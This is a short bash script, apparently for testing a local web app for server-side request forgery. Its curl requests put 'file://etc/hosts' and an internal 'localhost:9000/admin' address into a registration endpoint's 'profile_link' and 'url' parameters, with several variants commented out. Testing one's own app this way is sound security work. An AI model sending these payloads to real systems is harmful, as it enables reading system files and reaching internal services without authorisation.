#!/bin/bash

# Set common options
URL="http://localhost:8080/api/v1/register"
HEADERS="-H 'Connection: keep-alive' -H 'Keep-Alive: timeout=5, max=100'"

# pattern1
# curl -vvv -X POST $HEADERS -H "Content-Type: application/json" -d  '{"username":"aaaa", "profile_link":"file://etc/hosts"}' $URL

# pattern2
# curl -vvv -X GET $HEADERS http://localhost:8080?url=localhost:9000/admin

# pattern3
curl -vvv -X POST $HEADERS -H "Content-Type: application/json" -d  '{"username":"aaaa", "profile_link":"http://localhost?url=file://etc/hosts"}' $URL


# Combining two requests in one curl command
# curl -vvv -X POST -H "Content-Type: application/json" -d '{"username":"aaaa", "profile_link":"http://localhost:8080"}' http://localhost:8080/api/v1/register?url=file://etc/hosts \
#      --next -X GET http://127.0.0.1:8080/
    